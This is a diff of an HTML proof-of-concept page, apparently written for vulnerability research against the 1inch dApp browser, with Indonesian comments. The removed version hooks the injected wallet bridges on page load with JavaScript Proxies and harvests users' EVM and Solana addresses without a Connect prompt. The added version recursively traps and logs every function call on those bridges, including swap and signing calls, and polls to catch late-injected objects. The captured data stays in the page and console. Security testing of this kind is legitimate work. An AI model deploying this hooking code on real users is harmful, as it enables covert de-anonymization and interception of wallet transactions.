@@ -2,155 +2,107 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch dApp Browser PoC v12 - Impact Escalation Test</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 15px; background: #121212; color: #e0e0e0; }
-        .card { background: #1e1e1e; border-radius: 8px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; }
-        .alert-box { background: #3d1212; border: 1px solid #d00; color: #ff8888; padding: 12px; border-radius: 6px; font-weight: bold; margin-top: 10px; display: none; }
-        .data-label { font-size: 11px; color: #888; text-transform: uppercase; margin-top: 8px; letter-spacing: 0.5px; }
-        .data-val { font-family: monospace; font-size: 12px; color: #fff; background: #0a0a0a; padding: 8px; border-radius: 4px; word-break: break-all; margin-top: 4px; border: 1px solid #222; }
-        button { background: #2563eb; color: white; border: none; padding: 10px 15px; border-radius: 6px; font-weight: bold; width: 100%; margin-top: 10px; cursor: pointer; }
-        button:active { background: #1d4ed8; }
-        .status-badge { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; background: #444; color: #fff; }
-        .status-danger { background: #b91c1c; color: #fff; }
-    </style>
-</head>
-<body>
-    <h2 style="margin-top:0; color:#fff;">1inch dApp Browser PoC v12</h2>
-    <p style="font-size: 12px; color: #aaa; margin-top:-10px;">Impact Escalation: Automatic De-anonymization & State Leak</p>
-
-    <!-- SKENARIO 1: AUTOMATIC USER DE-ANONYMIZATION -->
-    <div class="card">
-        <h3 style="margin-top:0; color:#f87171;">1. Automatic User De-anonymization</h3>
-        <p style="font-size: 12px; color: #ccc;">Membuktikan bahwa halaman web dapat memanen identitas dompet secara otomatis saat dimuat tanpa persetujuan pengguna (tanpa prompt 'Connect').</p>
-        
-        <div class="data-label">Status Pelacakan:</div>
-        <div style="margin-top:4px;"><span id="trackStatus" class="status-badge">Memantau Event Bridge...</span></div>
-
-        <div class="data-label">Alamat EVM (Ethereum) Terpapar:</div>
-        <div id="evmAddr" class="data-val">Belum terdeteksi...</div>
-
-        <div class="data-label">Alamat Solana Terpapar:</div>
-        <div id="solAddr" class="data-val">Belum terdeteksi...</div>
-
-        <div id="deanonAlert" class="alert-box">
-            🚨 BUKTI DAMPAK: Identitas pengguna berhasil dipanen secara otomatis saat halaman dimuat tanpa otorisasi!
-        </div>
-    </div>
-
-    <!-- SKENARIO 2: AUTO-CONNECT & STATE BYPASS -->
-    <div class="card">
-        <h3 style="margin-top:0; color:#60a5fa;">2. Auto-Connect / State Leak Test</h3>
-        <p style="font-size: 12px; color: #ccc;">Menguji apakah status koneksi/alamat yang bocor dapat dimanfaatkan langsung tanpa dialog 'Connect Wallet'.</p>
-
-        <button onclick="checkAuthState()">Uji Status Otorisasi (Check Auth State)</button>
-        <button onclick="requestExplicitConnect()" style="background: #374151;">Minta Koneksi Standar (eth_requestAccounts)</button>
-
-        <div id="authResult" class="data-val" style="margin-top: 10px; display: none;"></div>
-    </div>
-
-    <!-- LOG MONITOR -->
-    <div class="card">
-        <h3 style="margin-top:0; font-size:14px;">Bridge Execution Log</h3>
-        <div id="logConsole" style="font-family: monospace; font-size: 11px; max-height: 140px; overflow-y: auto; background: #050505; padding: 8px; border-radius: 4px; color: #4ade80;"></div>
-    </div>
-
+    <title>1inch Hijack Test v13 - Deep Callback & Property Intercept</title>
     <script>
-        function log(msg) {
-            const consoleDiv = document.getElementById('logConsole');
-            const entry = document.createElement('div');
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            consoleDiv.prepend(entry);
+        function log(msg, color = "black") {
+            console.log("[1inch-v13] " + msg);
+            const div = document.createElement('div');
+            div.style.color = color;
+            div.style.margin = "4px 0";
+            div.style.fontFamily = "monospace";
+            div.style.fontSize = "12px";
+            div.style.wordBreak = "break-all";
+            div.style.fontWeight = (color === "red" || color === "#d00") ? "bold" : "normal";
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            document.body.prepend(div);
         }
 
-        let harvestedEVM = null;
-        let harvestedSol = null;
+        // Fungsi rekursif untuk membongkar dan menjebak semua fungsi di dalam objek bridge
+        function deepTrapObject(obj, path = "") {
+            if (!obj || typeof obj !== 'object' && typeof obj !== 'function') return;
 
-        function triggerDeanonImpact() {
-            if (harvestedEVM || harvestedSol) {
-                const badge = document.getElementById('trackStatus');
-                badge.textContent = "TERLACAK / DE-ANONYMIZED";
-                badge.className = "status-badge status-danger";
-
-                document.getElementById('deanonAlert').style.display = "block";
-                log("🔥 IMPACT PROVED: Identitas pengguna dipanen secara otomatis!");
-            }
-        }
-
-        function hookBridge(bridgeName, isSolana = false) {
-            if (window[bridgeName]) {
-                const target = window[bridgeName];
-                
-                // Intercept jika bridge berupa fungsi
-                window[bridgeName] = new Proxy(target, {
+            // Jika objek itu sendiri adalah fungsi, proxy fungsi tersebut
+            if (typeof obj === 'function' && !obj.__isProxied) {
+                return new Proxy(obj, {
                     apply(target, thisArg, args) {
-                        log(`Bridge Execution: ${bridgeName} -> ${JSON.stringify(args)}`);
-                        if (args && args.length > 0) {
-                            const payload = typeof args[0] === 'string' ? args[0] : JSON.stringify(args[0]);
-                            if (payload.includes('0x') || payload.length > 25) {
-                                if (isSolana) {
-                                    harvestedSol = payload;
-                                    document.getElementById('solAddr').textContent = payload;
-                                } else {
-                                    harvestedEVM = payload;
-                                    document.getElementById('evmAddr').textContent = payload;
-                                }
-                                triggerDeanonImpact();
-                            }
-                        }
+                        log(`🚨 EXECUTED ${path}(...) -> Args: ${JSON.stringify(args)}`, "#d00");
                         return target.apply(thisArg, args);
                     },
                     get(target, prop, receiver) {
-                        log(`Bridge Property Access: ${bridgeName}.${prop}`);
-                        return Reflect.get(target, prop, receiver);
+                        const val = Reflect.get(target, prop, receiver);
+                        if (typeof val === 'function') {
+                            return function(...subArgs) {
+                                log(`🚨 CALLED ${path}.${prop}(...) -> Args: ${JSON.stringify(subArgs)}`, "#d00");
+                                return val.apply(this, subArgs);
+                            };
+                        }
+                        return val;
                     }
                 });
-                log(`[+] Proxy Interceptor aktif pada window.${bridgeName}`);
-            }
-        }
-
-        function checkAuthState() {
-            const resultDiv = document.getElementById('authResult');
-            resultDiv.style.display = 'block';
-
-            let info = [];
-            if (harvestedEVM) {
-                info.push(`• Alamat Terbocor di DOM: ${harvestedEVM}`);
-            }
-            if (window.ethereum && window.ethereum.selectedAddress) {
-                info.push(`• window.ethereum.selectedAddress terbuka sebelum prompt: ${window.ethereum.selectedAddress}`);
-            } else {
-                info.push(`• window.ethereum.selectedAddress dalam kondisi aman (null).`);
             }
 
-            if (harvestedEVM) {
-                resultDiv.innerHTML = `<span style="color:#f87171; font-weight:bold;">HASIL: BUKTI DAMPAK TERKONFIRMASI</span><br>${info.join('<br>')}<br><br><i>Dampak Security: dApp pihak ketiga dapat langsung membuat sesi pengguna menggunakan alamat yang dibocorkan tanpa persetujuan dialog 'Connect Wallet'!</i>`;
-            } else {
-                resultDiv.innerHTML = `<span style="color:#4ade80; font-weight:bold;">HASIL: AMAN</span><br>Alamat belum terdeteksi dibocorkan secara langsung.`;
-            }
-        }
-
-        async function requestExplicitConnect() {
-            if (window.ethereum && window.ethereum.request) {
+            // Jika objek biasa, loop semua propertinya
+            for (let key in obj) {
                 try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    log(`Koneksi Eksplisit Sukses: ${accounts[0]}`);
-                } catch(e) {
-                    log(`Koneksi Ditolak/Gagal: ${e.message}`);
-                }
+                    const fullPath = path ? `${path}.${key}` : key;
+                    const descriptor = Object.getOwnPropertyDescriptor(obj, key);
+                    
+                    if (descriptor && descriptor.configurable) {
+                        const originalVal = obj[key];
+                        
+                        if (typeof originalVal === 'function') {
+                            obj[key] = function(...args) {
+                                log(`🚨 HOOKED CALL: ${fullPath}(...) -> Args: ${JSON.stringify(args)}`, "#d00");
+                                return originalVal.apply(this, args);
+                            };
+                            log(`[+] Armed hook on: ${fullPath}`, "green");
+                        } else if (typeof originalVal === 'object' && originalVal !== null) {
+                            obj[key] = deepTrapObject(originalVal, fullPath);
+                        }
+                    }
+                } catch (e) {}
+            }
+            return obj;
+        }
+
+        function initializeBypass() {
+            log("[+] Initializing Deep Callback Interceptor v13...", "blue");
+
+            // Pantau dan jebak window.OneInchIOSWallet secara total
+            if (window.OneInchIOSWallet) {
+                log("[!] Found window.OneInchIOSWallet. Applying deep trap...", "purple");
+                window.OneInchIOSWallet = deepTrapObject(window.OneInchIOSWallet, "OneInchIOSWallet");
             } else {
-                log("window.ethereum.request tidak tersedia.");
+                log("[-] window.OneInchIOSWallet not found yet. Polling...", "orange");
+            }
+
+            // Pantau juga window.OneInchSolanaWallet
+            if (window.OneInchSolanaWallet) {
+                log("[!] Found window.OneInchSolanaWallet. Applying deep trap...", "purple");
+                window.OneInchSolanaWallet = deepTrapObject(window.OneInchSolanaWallet, "OneInchSolanaWallet");
             }
         }
 
+        // Jalankan polling berkala untuk memastikan objek yang di-inject belakangan ikut terjebak
         window.onload = function() {
-            log("PoC v12 Loaded. Memulai pengujian ekosistem bridge...");
-            setTimeout(() => {
-                hookBridge('OneInchIOSWallet', false);
-                hookBridge('OneInchSolanaWallet', true);
-            }, 300);
+            log("1inch Full Coverage Test v13 Loaded");
+            setTimeout(initializeBypass, 500);
+            setInterval(initializeBypass, 1500);
         };
     </script>
+</head>
+<body style="padding:15px; font-family:Arial; background-color: #f9f9f9;">
+    <h3 style="color: #111; margin-top:0;">1inch Hijack Test v13</h3>
+    <p style="color: #555; font-size: 13px;">Deep Callback & Property Hijacking POC...</p>
+    <hr style="border:0; border-top:1px solid #ccc; margin:10px 0;">
+    
+    <div style="background: #fff; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;">
+        <h4 style="margin: 0 0 8px 0; color: #333;">Instruksi Pengujian v13:</h4>
+        <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
+            <li>Buka halaman ini di dApp browser 1inch.</li>
+            <li>Lakukan proses Swap atau panggil fungsi transaksi/signing.</li>
+            <li>Perhatikan apakah ada log merah baru yang mencetak fungsi turunan (seperti *executeCallback* atau fungsi kustom lainnya).</li>
+        </ol>
+    </div>
 </body>
 </html>
